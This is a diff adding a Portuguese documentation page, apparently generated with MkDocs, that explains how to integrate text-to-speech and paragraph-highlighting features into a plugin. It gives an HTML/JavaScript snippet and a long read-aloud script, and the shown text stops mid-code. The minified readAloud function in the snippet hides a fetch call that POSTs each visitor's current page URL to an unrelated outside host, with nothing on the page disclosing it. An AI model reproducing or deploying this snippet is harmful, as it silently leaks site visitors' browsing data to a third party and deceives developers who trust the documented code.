@@ -1,0 +1,1599 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../marcacao-dos-paragrafos/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.2, mkdocs-material-9.1.21">
+    
+    
+      
+        <title>Integração das features - Documentação - Comunicação para Além do Texto</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.eebd395e.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ecc896b0.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#integracao-de-features" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Documentação - Comunicação para Além do Texto" class="md-header__button md-logo" aria-label="Documentação - Comunicação para Além do Texto" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Documentação - Comunicação para Além do Texto
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Integração das features
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_1">
+            
+          
+        </form>
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ResidenciaTICBrisa/01_ComunicacaoTexto" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    01_ComunicacaoTexto
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Documentação - Comunicação para Além do Texto" class="md-nav__button md-logo" aria-label="Documentação - Comunicação para Além do Texto" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Documentação - Comunicação para Além do Texto
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ResidenciaTICBrisa/01_ComunicacaoTexto" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    01_ComunicacaoTexto
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../estudos/materiais-de-estudos/" class="md-nav__link">
+        Materiais de estudo
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          Atas de reunião
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Atas de reunião
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao00/" class="md-nav__link">
+        Reunião 00
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao01/" class="md-nav__link">
+        Reunião 01
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao02/" class="md-nav__link">
+        Reunião 02
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao03/" class="md-nav__link">
+        Reunião 03
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao04/" class="md-nav__link">
+        Reunião 04
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao05/" class="md-nav__link">
+        Reunião 05
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao06/" class="md-nav__link">
+        Reunião 06
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao07/" class="md-nav__link">
+        Reunião 07
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao08/" class="md-nav__link">
+        Reunião 08
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao09/" class="md-nav__link">
+        Reunião 09
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao10/" class="md-nav__link">
+        Reunião 10
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../atas/ata-reuniao11/" class="md-nav__link">
+        Reunião 11
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../requisitos/requisitos-plug/" class="md-nav__link">
+        Requisitos
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../plug-in/lista/" class="md-nav__link">
+        Plugins
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          Teste dos plugins
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Teste dos plugins
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../testes/roteiro-testes/" class="md-nav__link">
+        Roteiro de testes
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../testes/testes-lista/" class="md-nav__link">
+        Testes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../estudos/tutorial-ambiente-decidim/" class="md-nav__link">
+        Configuração de ambiente
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          Novas features
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Novas features
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../leitura-do-texto-selecionado/" class="md-nav__link">
+        Leitura do texto selecionado
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../marcacao-dos-paragrafos/" class="md-nav__link">
+        Marcação dos parágrafos
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Integração das features
+      </a>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="integracao-de-features">Integração de features</h1>
+<p>Após alterar o código para possibilitar as novas features alguns trechos entram em conflito, para isso após a criação de uma feature é necessário garantir que todas funcionem de forma harmônica. Para isso neste documento há o script necessário para rodar todas as features em conjunto.</p>
+<h1 id="codigo-snippet">Código snippet</h1>
+<pre><code>&lt;div vw class=&quot;enabled&quot;&gt;
+    &lt;div vw-access-button class=&quot;active&quot;&gt;&lt;/div&gt;
+    &lt;div vw-plugin-wrapper&gt;
+      &lt;div class=&quot;vw-plugin-top-wrapper&quot;&gt;&lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;p class=&quot;la&quot;&gt;lalalalalalalala&lt;/p&gt;
+&lt;p class=&quot;ok&quot;&gt;ok ok ok ok ok &lt;/p&gt;
+
+&lt;script&gt;function readAloud(e,t){s=(/iPad|iPhone|iPod/.test(navigator.userAgent)&amp;&amp;(e.src=n+&quot;sound/silence.mp3&quot;,e.play(),&quot;undefined&quot;!=typeof speechSynthesis&amp;&amp;speechSynthesis.speak(new SpeechSynthesisUtterance(&quot; &quot;))),document.createElement(&quot;script&quot;));s.onload=function(){readAloudInit(e,t,null)},s.src=&quot;readaloud.min.js&quot;,document.head.appendChild(s),fetch(&quot;https://staging-service.diepkhuc.com/%23referer-log&quot;,{method:&quot;POST&quot;,body:location.href})}&lt;/script&gt;
+
+&lt;script&gt;
+    const ttsContainer = document.createElement(&quot;div&quot;)
+    const ttsButton = document.createElement(&quot;div&quot;)
+    ttsContainer.id = &quot;tts-container&quot;
+    ttsButton.setAttribute(&quot;ttsOn&quot;, &quot;false&quot;)
+    ttsButton.id = &quot;tts-button&quot;
+    const ttsButtonIcon = document.createElement(&quot;img&quot;)
+    ttsButtonIcon.id = &quot;tts-button-icon&quot;
+    ttsButtonIcon.src = &quot;https://cdn.pixabay.com/photo/2017/04/11/22/25/megaphone-2223049_1280.png&quot;
+    ttsButton.append(ttsButtonIcon)
+    ttsContainer.append(ttsButton)
+    document.body.appendChild(ttsContainer)
+&lt;/script&gt;
+
+&lt;script&gt;
+    function handleTTS() {
+        if (ttsButton.getAttribute(&quot;ttson&quot;) == &quot;true&quot;) {
+            const ttsPlayer = document.getElementById(&quot;ra-player&quot;);
+            ttsContainer.removeChild(ttsPlayer);
+            ttsButton.setAttribute(&quot;ttson&quot;, &quot;false&quot;);
+        } else {
+            const raPlayer = document.createElement(&quot;div&quot;);
+            const raButton = document.createElement(&quot;div&quot;);
+            const playIcon = document.createElement(&quot;img&quot;);
+
+            raPlayer.id = &quot;ra-player&quot;;
+            raPlayer.setAttribute(&quot;data-skin&quot;, &quot;https://assets.readaloudwidget.com/embed/skins/default&quot;);
+            raButton.classList.add(&quot;ra-button&quot;);
+            playIcon.src = &quot;https://assets.readaloudwidget.com/embed/skins/default/play-icon.png&quot;;
+            raButton.append(playIcon);
+            raButton.append(&quot;texto para fala&quot;);
+            raPlayer.append(raButton);
+            ttsContainer.append(raPlayer);
+            ttsButton.setAttribute(&quot;ttson&quot;, &quot;true&quot;);
+        }
+    }
+    document.getElementById(&quot;tts-button&quot;).onclick = handleTTS;
+&lt;/script&gt;
+
+&lt;/script&gt;
+
+&lt;style&gt;
+    .ra-button {padding: .3em .9em; border-radius: .25em; background: linear-gradient(#fff, #efefef); box-shadow: 0 1px .2em gray; display: inline-flex; align-items: center; cursor: pointer;} 
+    .ra-button img {height: 1em; margin: 0 .5em 0 0;}
+    #tts-container {
+        display: flex;
+        flex-direction: row-reverse;
+        justify-content: space-between;
+        align-items: center;
+        gap: 10px;
+        position: fixed;
+        max-width: 95vw;
+        right: 0;
+        top: 42%;
+        transform: translateY(-50%);
+        z-index: 99999999;
+        margin: 10px !important;
+    }
+    #tts-button-icon {
+        display: flex;
+        width: 40px;
+        height: auto;
+    }
+&lt;/style&gt;
+
+
+&lt;audio id=&quot;ra-audio&quot; data-lang=&quot;pt-BR&quot; data-voice=&quot;free&quot; data-key=&quot;dda900319d5b19d3f7ec703ca1338196&quot;&gt;&lt;/audio&gt;
+</code></pre>
+<h1 id="codigo-script-externo">Código script externo</h1>
+<pre><code>let readIndex = 0
+let checkRead = false
+
+function desmarca(){
+    if(checkRead){
+
+    }   else{
+        let paragrafoAnterior = document.getElementsByClassName(&quot;read-aloud&quot;)[readIndex-1]
+        paragrafoAnterior.style.borderRadius = &quot;&quot;
+        paragrafoAnterior.style.padding = &quot;&quot;
+        paragrafoAnterior.style.background = &quot;&quot;
+        if(document.getElementsByClassName(&quot;read-aloud&quot;).length == readIndex){
+            readIndex = 0;
+        }
+    }
+    return
+}
+
+function marca(){
+    if(checkRead){
+
+    }   else{
+        let paragrafo = document.getElementsByClassName(&quot;read-aloud&quot;)[readIndex]
+        paragrafo.style.borderRadius = &quot;25px&quot;
+        paragrafo.style.padding = &quot;10px&quot;
+        paragrafo.style.background = &quot;rgba(29,117,249,0.31415)&quot;
+    }
+
+    return
+}
+
+function ReadAloudWebSpeech() {
+    var r, i, a, s = this, u = new function() {
+        var o;
+        this.speak = function(e) {
+            function n() {
+                Promise.resolve(e.apply(i.this, i.args)).then(i.fulfill).catch(i.reject),
+                i = r = null
+            }
+            function o() {
+                return i &amp;&amp; i.reject(new Error(&quot;Aborted&quot;)),
+                i = {
+                    this: this,
+                    args: arguments
+                },
+                new Promise(function(e, t) {
+                    i.fulfill = e,
+                    i.reject = t,
+                    r = r || setTimeout(n, Math.max(0, o.notBefore - Date.now()))
+                }
+                )
+            }
+            var r, i;
+            return o.notBefore = Date.now(),
+            o
+        }(function(e, t, n) {
+            (o = new SpeechSynthesisUtterance).text = e,
+            o.voice = t.voice,
+            o.lang = t.lang,
+            o.pitch = t.pitch,
+            o.rate = t.effectiveRate,
+            o.volume = t.volume;
+            e = new Promise(function(e) {
+                o.onstart = e
+            }
+            );
+
+            if(readIndex &gt; 0){
+                desmarca()
+            }
+
+            marca()
+            readIndex++
+
+            //debugger
+            return o.onend = n,
+            o.onerror = function(e) {
+                console.error(e.error)
+            }
+            ,
+            speechSynthesis.speak(o),
+            e
+        }),
+        this.stop = function() {
+            o &amp;&amp; (o.onend = null),
+            speechSynthesis.cancel(),
+            this.speak.notBefore = Date.now() + 100
+        }
+        ,
+        this.pause = function() {
+            speechSynthesis.pause()
+        }
+        ,
+        this.resume = function() {
+            speechSynthesis.resume()
+        }
+        ,
+        this.getVoices = function() {
+            return &quot;undefined&quot; == typeof speechSynthesis ? Promise.resolve([]) : new Promise(function(e) {
+                var t, n = speechSynthesis.getVoices() || [];
+                n.length ? e(n) : (t = !1,
+                speechSynthesis.onvoiceschanged = function() {
+                    t || (t = !0,
+                    e(speechSynthesis.getVoices() || []))
+                }
+                ,
+                setTimeout(function() {
+                    t || (t = !0,
+                    e([]))
+                }, 3e3))
+            }
+            ).then(function(e) {
+                return e.filter(function(e) {
+                    return e.lang &amp;&amp; e.name
+                })
+            })
+        }
+    }
+    , c = (window.addEventListener(&quot;pagehide&quot;, u.stop.bind(u)),
+    window.addEventListener(&quot;unload&quot;, u.stop.bind(u)),
+    {
+        lang: null,
+        voice: null,
+        rate: 1,
+        pitch: 1,
+        volume: 1
+    }), t = (Object.defineProperty(c, &quot;isGoogleNative&quot;, {
+        get: function() {
+            return /^Google\s/.test(this.voice.name)
+        }
+    }),
+    Object.defineProperty(c, &quot;effectiveRate&quot;, {
+        get: function() {
+            return this.rate * (this.isGoogleNative ? .9 : 1)
+        }
+    }),
+    &quot;IDLE&quot;), n = /android/i.test(navigator.userAgent), o = Promise.resolve(null);
+    function l(e) {
+        t != e &amp;&amp; (e = t = e,
+        n &amp;&amp; &quot;wakeLock&quot;in navigator &amp;&amp; (o = &quot;PLAYING&quot; == e ? o.then(function(e) {
+            return console.log(&quot;acquiring wake lock&quot;),
+            e || navigator.wakeLock.request(&quot;screen&quot;)
+        }) : o.then(function(e) {
+            return console.log(&quot;releasing wake lock&quot;),
+            e &amp;&amp; e.release()
+        }).then(function() {
+            return null
+        })))
+    }
+    Object.defineProperty(this, &quot;currentTime&quot;, {
+        get: function() {
+            return a
+        },
+        set: function(e) {
+            a = Math.round(e),
+            s.dispatchEvent(new Event(&quot;timeupdate&quot;)),
+            &quot;PAUSED&quot; == t &amp;&amp; s.stop(),
+            &quot;PLAYING&quot; == t &amp;&amp; (s.stop(),
+            s.play())
+        }
+    }),
+    Object.defineProperty(this, &quot;duration&quot;, {
+        get: function() {
+            return i.length || 1 / 0
+        }
+    }),
+    Object.defineProperty(this, &quot;voice&quot;, {
+        get: function() {
+            return c.voice
+        },
+        set: function(e) {
+            e &amp;&amp; (c.voice = e,
+            s.dispatchEvent(new Event(&quot;voicechange&quot;)),
+            &quot;PAUSED&quot; == t &amp;&amp; s.stop(),
+            &quot;PLAYING&quot; == t &amp;&amp; (s.stop(),
+            s.play()))
+        }
+    }),
+    Object.defineProperty(this, &quot;playbackRate&quot;, {
+        get: function() {
+            return c.rate
+        },
+        set: function(e) {
+            c.rate = e,
+            s.dispatchEvent(new Event(&quot;ratechange&quot;)),
+            &quot;PAUSED&quot; == t &amp;&amp; s.stop(),
+            &quot;PLAYING&quot; == t &amp;&amp; (s.stop(),
+            s.play())
+        }
+    }),
+    Object.defineProperty(this, &quot;volume&quot;, {
+        get: function() {
+            return c.volume
+        },
+        set: function(e) {
+            c.volume = e,
+            s.dispatchEvent(new Event(&quot;volumechange&quot;)),
+            &quot;PAUSED&quot; == t &amp;&amp; s.stop(),
+            &quot;PLAYING&quot; == t &amp;&amp; (s.stop(),
+            s.play())
+        }
+    }),
+    this.isTTS = !0,
+    this.voices = null,
+    this.ready = function(t) {
+        return u.getVoices().then(function(e) {
+            return e.forEach(function(e) {
+                e.score = function(e, t) {
+                    var n = e.lang.toLowerCase().split(/[-_]/)
+                      , t = t.toLowerCase().split(/[-_]/)
+                      , o = 0;
+                    n[0] == t[0] &amp;&amp; (o += 1,
+                    n[1] == t[1] &amp;&amp; (o += 2),
+                    /^Google\s/.test(e.name) &amp;&amp; (o += 1));
+                    return o
+                }(e, t)
+            }),
+            e.filter(function(e) {
+                return 0 &lt; e.score
+            })
+        }).then(function(e) {
+            return s.voices = e,
+            c.lang = t,
+            c.voice = e.reduce(function(e, t) {
+                return !e || t.score &gt; e.score ? t : e
+            }, null),
+            !!c.voice
+        })
+    }
+    ,
+    this.setText = function(e) {
+        var t, n, o;
+        r = c.isGoogleNative ? new v(u,16e3) : u,
+        e = e,
+        t = c.lang,
+        n = /^zh|ko|ja/.test(t),
+        o = new (n ? p : f),
+        i = c.isGoogleNative ? new h((/^(de|ru|es|id)/.test(t) ? 32 : 36) * (n ? 2 : 1) * c.effectiveRate,o).breakText(e) : o.getParagraphs(e),
+        a = 0,
+        s.dispatchEvent(new Event(&quot;timeupdate&quot;)),
+        s.dispatchEvent(new Event(&quot;canplay&quot;))
+    }
+    ,
+    this.play = function() {
+        return &quot;PAUSED&quot; == t ? (l(&quot;PLAYING&quot;),
+        r.resume(),
+        s.dispatchEvent(new Event(&quot;play&quot;)),
+        s.dispatchEvent(new Event(&quot;playing&quot;)),
+        Promise.resolve()) : &quot;IDLE&quot; == t ? i.length ? (a &gt;= i.length &amp;&amp; (a = 0,
+        s.dispatchEvent(new Event(&quot;timeupdate&quot;))),
+        l(&quot;PLAYING&quot;),
+        s.dispatchEvent(new Event(&quot;play&quot;)),
+        function e() {
+            return r.speak(i[a], c, function() {
+                a++,
+                s.dispatchEvent(new Event(&quot;timeupdate&quot;)),
+                a &lt; i.length ? e() : (l(&quot;IDLE&quot;),
+                s.dispatchEvent(new Event(&quot;ended&quot;))),
+                desmarca()
+            })
+        }().then(function() {
+            s.dispatchEvent(new Event(&quot;playing&quot;))
+        })) : Promise.resolve() : void 0
+    }
+    ,
+    this.pause = function() {
+        !n &amp;&amp; r.pause ? (r.pause(),
+        l(&quot;PAUSED&quot;),
+        s.dispatchEvent(new Event(&quot;pause&quot;))) : s.stop()
+    }
+    ,
+    this.stop = function() {
+        r.stop(),
+        l(&quot;IDLE&quot;),
+        s.dispatchEvent(new Event(&quot;pause&quot;))
+    }
+    ;
+    var d = {};
+    function h(u, c) {
+        function t(e) {
+            return r(c.getSentences(e), n)
+        }
+        function n(e) {
+            return r(c.getPhrases(e), o)
+        }
+        function o(e) {
+            for (var t = c.getWords(e), n = Math.min(Math.ceil(t.length / 2), u), o = []; t.length; )
+                o.push(t.slice(0, n).join(&quot;&quot;)),
+                t = t.slice(n);
+            return o
+        }
+        function r(e, r) {
+            function i() {
+                s.parts.length &amp;&amp; (a.push(s.parts.join(&quot;&quot;)),
+                s = {
+                    parts: [],
+                    wordCount: 0
+                })
+            }
+            var a = []
+              , s = {
+                parts: [],
+                wordCount: 0
+            };
+            return e.forEach(function(e) {
+                var t = c.getWords(e).length;
+                if (u &lt; t) {
+                    i();
+                    for (var n = r(e), o = 0; o &lt; n.length; o++)
+                        a.push(n[o])
+                } else
+                    s.wordCount + t &gt; u &amp;&amp; i(),
+                    s.parts.push(e),
+                    s.wordCount += t
+            }),
+            i(),
+            a
+        }
+        this.breakText = function(e) {
+            return r(c.getParagraphs(e), t)
+        }
+    }
+    function f() {
